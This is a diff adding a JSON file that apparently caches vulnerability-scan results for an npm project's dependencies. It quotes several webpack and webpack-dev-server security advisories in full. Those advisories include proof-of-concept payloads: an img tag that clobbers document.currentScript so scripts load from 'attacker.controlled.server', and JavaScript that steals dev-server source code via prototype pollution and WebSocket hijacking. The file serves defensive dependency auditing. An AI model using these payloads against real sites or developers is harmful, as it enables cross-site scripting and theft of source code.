@@ -1,0 +1,436 @@
+{
+  "npm:@eslint/js": {},
+  "npm:archiver": {},
+  "npm:copy-webpack-plugin": {},
+  "npm:del": {},
+  "npm:eslint": {},
+  "npm:eslint-plugin-mocha": {},
+  "npm:glob": {},
+  "npm:globals": {},
+  "npm:gulp": {},
+  "npm:gulp-autoprefixer": {},
+  "npm:gulp-eslint-new": {},
+  "npm:gulp-header": {},
+  "npm:gulp-rename": {},
+  "npm:html-webpack-plugin": {},
+  "npm:main.css": {},
+  "npm:mocha": {},
+  "npm:prettier": {},
+  "npm:webpack": {
+    "vulns": [
+      {
+        "id": "GHSA-4vvj-4cpr-p986",
+        "summary": "Webpack's AutoPublicPathRuntimeModule has a DOM Clobbering Gadget that leads to XSS",
+        "details": "### Summary\n\nWe discovered a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.\n\nWe found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.\n\n\n### Details\n\n#### Backgrounds\n\nDOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:\n\n[1] https://scnps.co/papers/sp23_domclob.pdf\n[2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/\n\n\n#### Gadgets found in Webpack\n\nWe identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:\n\n```\n/******/ \t/* webpack/runtime/publicPath */\n/******/ \t(() => {\n/******/ \t\tvar scriptUrl;\n/******/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n/******/ \t\tvar document = __webpack_require__.g.document;\n/******/ \t\tif (!scriptUrl && document) {\n/******/ \t\t\tif (document.currentScript)\n/******/ \t\t\t\tscriptUrl = document.currentScript.src;\n/******/ \t\t\tif (!scriptUrl) {\n/******/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n/******/ \t\t\t\tif(scripts.length) {\n/******/ \t\t\t\t\tvar i = scripts.length - 1;\n/******/ \t\t\t\t\twhile (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t}\n/******/ \t\t// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n/******/ \t\t// or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n/******/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n/******/ \t\tscriptUrl = scriptUrl.replace(/#.*$/, \"\").replace(/\\?.*$/, \"\").replace(/\\/[^\\/]+$/, \"/\");\n/******/ \t\t__webpack_require__.p = scriptUrl;\n/******/ \t})();\n```\n\nHowever, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.\n\n### PoC\n\nPlease note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.\n\nConsider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:\n\n```\n// entry.js\nimport('./import1.js')\n  .then(module => {\n    module.hello();\n  })\n  .catch(err => {\n    console.error('Failed to load module', err);\n  });\n```\n\n```\n// import1.js\nexport function hello () {\n  console.log('Hello');\n}\n```\n\nThe webpack.config.js is set up as follows:\n```\nconst path = require('path');\n\nmodule.exports = {\n  entry: './entry.js', // Ensure the correct path to your entry file\n  output: {\n    filename: 'webpack-gadgets.bundle.js', // Output bundle file\n    path: path.resolve(__dirname, 'dist'), // Output directory\n    publicPath: \"auto\", // Or leave this field not set\n  },\n  target: 'web',\n  mode: 'development',\n};\n```\n\nWhen the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.\n\n```\n<!DOCTYPE html>\n<html>\n<head>\n  <title>Webpack Example</title>\n  <!-- Attacker-controlled Script-less HTML Element starts--!>\n  <img name=\"currentScript\" src=\"https://attacker.controlled.server/\"></img>\n  <!-- Attacker-controlled Script-less HTML Element ends--!>\n</head>\n<script src=\"./dist/webpack-gadgets.bundle.js\"></script>\n<body>\n</body>\n</html>\n```\n\n### Impact\n\nThis vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.\n\n### Patch\n\nA possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174\n\n```\n/******/ \t/* webpack/runtime/publicPath */\n/******/ \t(() => {\n/******/ \t\tvar scriptUrl;\n/******/ \t\tif (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + \"\";\n/******/ \t\tvar document = __webpack_require__.g.document;\n/******/ \t\tif (!scriptUrl && document) {\n/******/ \t\t\tif (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :>\n/******/ \t\t\t\tscriptUrl = document.currentScript.src;\n/******/ \t\t\tif (!scriptUrl) {\n/******/ \t\t\t\tvar scripts = document.getElementsByTagName(\"script\");\n/******/ \t\t\t\tif(scripts.length) {\n/******/ \t\t\t\t\tvar i = scripts.length - 1;\n/******/ \t\t\t\t\twhile (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src;\n/******/ \t\t\t\t}\n/******/ \t\t\t}\n/******/ \t\t}\n/******/ \t\t// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration\n/******/ \t\t// or pass an empty string (\"\") and set the __webpack_public_path__ variable from your code to use your own logic.\n/******/ \t\tif (!scriptUrl) throw new Error(\"Automatic publicPath is not supported in this browser\");\n/******/ \t\tscriptUrl = scriptUrl.replace(/#.*$/, \"\").replace(/\\?.*$/, \"\").replace(/\\/[^\\/]+$/, \"/\");\n/******/ \t\t__webpack_require__.p = scriptUrl;\n/******/ \t})();\n```\n\nPlease note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.",
+        "aliases": [
+          "CVE-2024-43788"
+        ],
+        "modified": "2025-07-29T11:26:59.611456Z",
+        "published": "2024-08-27T19:50:40Z",
+        "related": [
+          "CGA-9rjf-f92q-2cm7",
+          "CGA-h43v-8hrp-cpgc",
+          "CGA-v955-45j8-9w79",
+          "CVE-2024-45389",
+          "CVE-2024-45812"
+        ],
+        "database_specific": {
+          "cwe_ids": [
+            "CWE-79"
+          ],
+          "github_reviewed": true,
+          "nvd_published_at": "2024-08-27T17:15:07Z",
+          "github_reviewed_at": "2024-08-27T19:50:40Z",
+          "severity": "MODERATE"
+        },
+        "references": [
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986"
+          },
+          {
+            "type": "ADVISORY",
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2024-43788"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack/issues/18718#issuecomment-2326296270"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack/commit/955e057abc6cc83cbc3fa1e1ef67a49758bf5a61"
+          },
+          {
+            "type": "PACKAGE",
+            "url": "https://github.com/webpack/webpack"
+          },
+          {
+            "type": "WEB",
+            "url": "https://research.securitum.com/xss-in-amp4email-dom-clobbering"
+          },
+          {
+            "type": "WEB",
+            "url": "https://scnps.co/papers/sp23_domclob.pdf"
+          }
+        ],
+        "affected": [
+          {
+            "package": {
+              "name": "webpack",
+              "ecosystem": "npm",
+              "purl": "pkg:npm/webpack"
+            },
+            "ranges": [
+              {
+                "type": "SEMVER",
+                "events": [
+                  {
+                    "introduced": "5.0.0-alpha.0"
+                  },
+                  {
+                    "fixed": "5.94.0"
+                  }
+                ]
+              }
+            ],
+            "database_specific": {
+              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/08/GHSA-4vvj-4cpr-p986/GHSA-4vvj-4cpr-p986.json"
+            }
+          }
+        ],
+        "schema_version": "1.7.3",
+        "severity": [
+          {
+            "type": "CVSS_V3",
+            "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H"
+          },
+          {
+            "type": "CVSS_V4",
+            "score": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:L/VI:L/VA:H/SC:N/SI:N/SA:N"
+          }
+        ]
+      },
+      {
+        "id": "GHSA-hc6q-2mpp-qw7j",
+        "summary": "Cross-realm object access in Webpack 5",
+        "details": "Webpack 5 before 5.76.0 does not avoid cross-realm object access. ImportParserPlugin.js mishandles the magic comment feature. An attacker who controls a property of an untrusted object can obtain access to the real global object.",
+        "aliases": [
+          "CVE-2023-28154"
+        ],
+        "modified": "2023-11-08T04:12:09.414542Z",
+        "published": "2023-03-13T03:30:15Z",
+        "database_specific": {
+          "cwe_ids": [],
+          "github_reviewed": true,
+          "nvd_published_at": "2023-03-13T01:15:00Z",
+          "github_reviewed_at": "2023-03-14T15:03:08Z",
+          "severity": "CRITICAL"
+        },
+        "references": [
+          {
+            "type": "ADVISORY",
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2023-28154"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack/pull/16500"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack/compare/v5.75.0...v5.76.0"
+          },
+          {
+            "type": "WEB",
+            "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/AU7BOXTBK3KDYSWH67ASZ22TUIOZ3X5G"
+          },
+          {
+            "type": "WEB",
+            "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/PPSAXUTXBCCTAHTCX5BUR4YVP25XALQ3"
+          },
+          {
+            "type": "WEB",
+            "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/U2AFCM6FFE3LRYI6KNEQWKMXMQOBZQ2D"
+          }
+        ],
+        "affected": [
+          {
+            "package": {
+              "name": "webpack",
+              "ecosystem": "npm",
+              "purl": "pkg:npm/webpack"
+            },
+            "ranges": [
+              {
+                "type": "SEMVER",
+                "events": [
+                  {
+                    "introduced": "5.0.0"
+                  },
+                  {
+                    "fixed": "5.76.0"
+                  }
+                ]
+              }
+            ],
+            "database_specific": {
+              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2023/03/GHSA-hc6q-2mpp-qw7j/GHSA-hc6q-2mpp-qw7j.json"
+            }
+          }
+        ],
+        "schema_version": "1.7.3",
+        "severity": [
+          {
+            "type": "CVSS_V3",
+            "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+          }
+        ]
+      }
+    ]
+  },
+  "npm:webpack-cli": {},
+  "npm:webpack-dev-server": {
+    "vulns": [
+      {
+        "id": "GHSA-4v9v-hfq4-rm2v",
+        "summary": "webpack-dev-server users' source code may be stolen when they access a malicious web site",
+        "details": "### Summary\nSource code may be stolen when you access a malicious web site.\n\n### Details\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. Combined with prototype pollution, the attacker can get a reference to the webpack runtime variables.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18426585/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://e29c9a88-a242-4fb4-9e64-b24c9d29b35b.pages.dev/`\n5. You can see the source code output in the document and the devtools console.\n\n![image](https://github.com/user-attachments/assets/9d4dcdca-5d24-4c84-a7b4-feb1782bca09)\n\nThe script in the POC site is:\n```js\nlet moduleList\nconst onHandlerSet = (handler) => {\n  console.log('h', handler)\n  moduleList = handler.require.m\n}\n\nconst originalArrayForEach = Array.prototype.forEach\nArray.prototype.forEach = function forEach(callback, thisArg) {\n  callback((handler) => {\n    onHandlerSet(handler)\n  })\n  originalArrayForEach.call(this, callback, thisArg)\n  Array.prototype.forEach = originalArrayForEach\n}\n\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n  console.log(moduleList)\n  for (const key in moduleList) {\n    const p = document.createElement('p')\n    const title = document.createElement('strong')\n    title.textContent = key\n    const code = document.createElement('code')\n    code.textContent = moduleList[key].toString()\n    p.append(title, ':', document.createElement('br'), code)\n    document.body.appendChild(p)\n  }\n})\ndocument.head.appendChild(script)\n```\n\nThis script uses the function generated by [`renderRequire`](https://github.com/webpack/webpack/blob/3919c844eca394d73ca930e4fc5506fb86e2b094/lib/javascript/JavascriptModulesPlugin.js#L1383).\n```js\n    // The require function\n    function __webpack_require__(moduleId) {\n        // Check if module is in cache\n        var cachedModule = __webpack_module_cache__[moduleId];\n        if (cachedModule !== undefined) {\n            return cachedModule.exports;\n        }\n        // Create a new module (and put it into the cache)\n        var module = __webpack_module_cache__[moduleId] = {\n            // no module.id needed\n            // no module.loaded needed\n            exports: {}\n        };\n        // Execute the module function\n        var execOptions = {\n            id: moduleId,\n            module: module,\n            factory: __webpack_modules__[moduleId],\n            require: __webpack_require__\n        };\n        __webpack_require__.i.forEach(function(handler) {\n            handler(execOptions);\n        });\n        module = execOptions.module;\n        execOptions.factory.call(module.exports, module, module.exports, execOptions.require);\n        // Return the exports of the module\n        return module.exports;\n    }\n```\nEspecially, it uses the fact that `Array::forEach` is called for `__webpack_require__.i` and `execOptions` contains `__webpack_require__`.\nIt uses prototype pollution against `Array::forEach` to extract `__webpack_require__` reference.\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and output path for the entrypoint script.\n\n<details>\n<summary>Old content</summary>\n\n### Summary\nSource code may be stolen when you use [`output.iife: false`](https://webpack.js.org/configuration/output/#outputiife) and access a malicious web site.\n\n### Details\nWhen `output.iife: false` is set, some global variables for the webpack runtime are declared on the `window` object (e.g. `__webpack_modules__`).\nBecause the request for classic script by a script tag is not subject to same origin policy, an attacker can inject `<script src=\"http://localhost:8080/main.js\">` in their site and run the script. Note that the attacker has to know the port and the output entrypoint script path. By running that, the webpack runtime variables will be declared on the `window` object.\nBy using `Function::toString` against the values in `__webpack_modules__`, the attacker can get the source code.\n\nI pointed out `output.iife: false`, but if there are other options that makes the webpack runtime variables to be declared on the `window` object, the same will apply for those cases.\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18409777/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `https://852aafa3-5f83-44da-9fc6-ea116d0e3035.pages.dev/`\n5. Open the devtools console.\n6. You can see the content of `src/index.js` and other scripts loaded.\n\n![image](https://github.com/user-attachments/assets/87801607-57bb-4656-bc0d-2bfbe207f436)\n\nThe script in the POC site is:\n```js\nconst script = document.createElement('script')\nscript.src = 'http://localhost:8080/main.js'\nscript.addEventListener('load', () => {\n    for (const module in window.__webpack_modules__) {\n        console.log(`${module}:`, window.__webpack_modules__[module].toString())\n    }\n})\ndocument.head.appendChild(script)\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that has `output.iife: false` option set and uses a predictable port and output path for the entrypoint script.\n\n</details>",
+        "aliases": [
+          "CVE-2025-30359"
+        ],
+        "modified": "2025-10-03T13:25:38Z",
+        "published": "2025-06-04T21:09:13Z",
+        "database_specific": {
+          "cwe_ids": [
+            "CWE-749"
+          ],
+          "github_reviewed_at": "2025-06-04T21:09:13Z",
+          "github_reviewed": true,
+          "nvd_published_at": "2025-06-03T18:15:25Z",
+          "severity": "MODERATE"
+        },
+        "references": [
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-4v9v-hfq4-rm2v"
+          },
+          {
+            "type": "ADVISORY",
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30359"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239"
+          },
+          {
+            "type": "PACKAGE",
+            "url": "https://github.com/webpack/webpack-dev-server"
+          }
+        ],
+        "affected": [
+          {
+            "package": {
+              "name": "webpack-dev-server",
+              "ecosystem": "npm",
+              "purl": "pkg:npm/webpack-dev-server"
+            },
+            "ranges": [
+              {
+                "type": "SEMVER",
+                "events": [
+                  {
+                    "introduced": "0"
+                  },
+                  {
+                    "fixed": "5.2.1"
+                  }
+                ]
+              }
+            ],
+            "database_specific": {
+              "last_known_affected_version_range": "<= 5.2.0",
+              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-4v9v-hfq4-rm2v/GHSA-4v9v-hfq4-rm2v.json"
+            }
+          }
+        ],
+        "schema_version": "1.7.3",
+        "severity": [
+          {
+            "type": "CVSS_V3",
+            "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:N/A:N"
+          }
+        ]
+      },
+      {
+        "id": "GHSA-9jgg-88mc-972h",
+        "summary": "webpack-dev-server users' source code may be stolen when they access a malicious web site with non-Chromium based browser",
+        "details": "### Summary\nSource code may be stolen when you access a malicious web site with non-Chromium based browser.\n\n### Details\nThe `Origin` header is checked to prevent Cross-site WebSocket hijacking from happening which was reported by CVE-2018-14732.\nBut webpack-dev-server always allows IP address `Origin` headers.\nhttps://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127\nThis allows websites that are served on IP addresses to connect WebSocket.\nBy using the same method described in [the article](https://blog.cal1.cn/post/Sniffing%20Codes%20in%20Hot%20Module%20Reloading%20Messages) linked from CVE-2018-14732, the attacker get the source code.\n\nrelated commit: https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb (note that `checkHost` function was only used for Host header to prevent DNS rebinding attacks so this change itself is fine.\n\nThis vulnerability does not affect Chrome 94+ (and other Chromium based browsers) users due to [the non-HTTPS private access blocking feature](https://developer.chrome.com/blog/private-network-access-update#chrome_94).\n\n### PoC\n1. Download [reproduction.zip](https://github.com/user-attachments/files/18418233/reproduction.zip) and extract it\n2. Run `npm i`\n3. Run `npx webpack-dev-server`\n4. Open `http://{ipaddress}/?target=http://localhost:8080&file=main` with a non-Chromium browser (I used Firefox 134.0.1)\n5. Edit `src/index.js` in the extracted directory\n6. You can see the content of `src/index.js`\n\n![image](https://github.com/user-attachments/assets/7ce3cad7-1a4d-4778-baae-1adae5e93ba4)\n\nThe script in the POC site is:\n```js\nwindow.webpackHotUpdate = (...args) => {\n    console.log(...args);\n    for (i in args[1]) {\n        document.body.innerText = args[1][i].toString() + document.body.innerText\n\t    console.log(args[1][i])\n    }\n}\n\nlet params = new URLSearchParams(window.location.search);\nlet target = new URL(params.get('target') || 'http://127.0.0.1:8080');\nlet file = params.get('file')\nlet wsProtocol = target.protocol === 'http:' ? 'ws' : 'wss';\nlet wsPort = target.port;\nvar currentHash = '';\nvar currentHash2 = '';\nlet wsTarget = `${wsProtocol}://${target.hostname}:${wsPort}/ws`;\nws = new WebSocket(wsTarget);\nws.onmessage = event => {\n    console.log(event.data);\n    if (event.data.match('\"type\":\"ok\"')) {\n        s = document.createElement('script');\n        s.src = `${target}${file}.${currentHash2}.hot-update.js`;\n        document.body.appendChild(s)\n    }\n    r = event.data.match(/\"([0-9a-f]{20})\"/);\n    if (r !== null) {\n        currentHash2 = currentHash;\n        currentHash = r[1];\n        console.log(currentHash, currentHash2);\n    }\n}\n```\n\n### Impact\nThis vulnerability can result in the source code to be stolen for users that uses a predictable port and uses a non-Chromium based browser.",
+        "aliases": [
+          "CVE-2025-30360"
+        ],
+        "modified": "2025-10-03T13:25:56Z",
+        "published": "2025-06-04T21:09:38Z",
+        "database_specific": {
+          "cwe_ids": [
+            "CWE-346"
+          ],
+          "github_reviewed_at": "2025-06-04T21:09:38Z",
+          "github_reviewed": true,
+          "nvd_published_at": "2025-06-03T18:15:25Z",
+          "severity": "MODERATE"
+        },
+        "references": [
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack-dev-server/security/advisories/GHSA-9jgg-88mc-972h"
+          },
+          {
+            "type": "ADVISORY",
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2025-30360"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack-dev-server/commit/5c9378bb01276357d7af208a0856ca2163db188e"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack-dev-server/commit/72efaab83381a0e1c4914adf401cbd210b7de7eb"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack-dev-server/commit/d2575ad8dfed9207ed810b5ea0ccf465115a2239"
+          },
+          {
+            "type": "PACKAGE",
+            "url": "https://github.com/webpack/webpack-dev-server"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack-dev-server/blob/55220a800ba4e30dbde2d98785ecf4c80b32f711/lib/Server.js#L3113-L3127"
+          }
+        ],
+        "affected": [
+          {
+            "package": {
+              "name": "webpack-dev-server",
+              "ecosystem": "npm",
+              "purl": "pkg:npm/webpack-dev-server"
+            },
+            "ranges": [
+              {
+                "type": "SEMVER",
+                "events": [
+                  {
+                    "introduced": "0"
+                  },
+                  {
+                    "fixed": "5.2.1"
+                  }
+                ]
+              }
+            ],
+            "database_specific": {
+              "last_known_affected_version_range": "<= 5.2.0",
+              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/06/GHSA-9jgg-88mc-972h/GHSA-9jgg-88mc-972h.json"
+            }
+          }
+        ],
+        "schema_version": "1.7.3",
+        "severity": [
+          {
+            "type": "CVSS_V3",
+            "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N"
+          }
+        ]
+      },
+      {
+        "id": "GHSA-cf66-xwfp-gvc4",
+        "summary": "Missing Origin Validation in webpack-dev-server",
+        "details": "Versions of `webpack-dev-server` before 3.1.10 are missing origin validation on the websocket server. This vulnerability allows a remote attacker to steal a developer's source code because the origin of requests to the websocket server that is used for Hot Module Replacement (HMR) are not validated.\n\n\n## Recommendation\nFor `webpack-dev-server` update to version 3.1.11 or later.",
+        "aliases": [
+          "CVE-2018-14732"
+        ],
+        "modified": "2023-11-08T03:59:56.988012Z",
+        "published": "2019-01-04T17:40:59Z",
+        "database_specific": {
+          "cwe_ids": [
+            "CWE-20"
+          ],
+          "github_reviewed_at": "2020-06-16T21:31:15Z",
+          "github_reviewed": true,
+          "nvd_published_at": null,
+          "severity": "HIGH"
+        },
+        "references": [
+          {
+            "type": "ADVISORY",
+            "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-14732"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack-dev-server/issues/1445"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack-dev-server/issues/1620"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack-dev-server/commit/f18e5adf123221a1015be63e1ca2491ca45b8d10"
+          },
+          {
+            "type": "PACKAGE",
+            "url": "https://github.com/webpack/webpack-dev-server"
+          },
+          {
+            "type": "WEB",
+            "url": "https://github.com/webpack/webpack-dev-server/blob/master/CHANGELOG.md#3111-2018-12-21"
+          },
+          {
+            "type": "WEB",
+            "url": "https://www.npmjs.com/advisories/725"
+          }
+        ],
+        "affected": [
+          {
+            "package": {
+              "name": "webpack-dev-server",
+              "ecosystem": "npm",
+              "purl": "pkg:npm/webpack-dev-server"
+            },
+            "ranges": [
+              {
+                "type": "SEMVER",
+                "events": [
+                  {
+                    "introduced": "0"
+                  },
+                  {
+                    "fixed": "3.1.11"
+                  }
+                ]
+              }
+            ],
+            "database_specific": {
+              "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2019/01/GHSA-cf66-xwfp-gvc4/GHSA-cf66-xwfp-gvc4.json"
+            }
+          }
+        ],
+        "schema_version": "1.7.3",
+        "severity": [
+          {
+            "type": "CVSS_V3",
+            "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
+          }
+        ]
+      }
+    ]
+  },
+  "npm:webpack-merge": {},
+  "npm:eslint-config-recommended": {},
+  "npm:gulp-eslint": {},
+  "npm:strip-json-comments": {}
+}
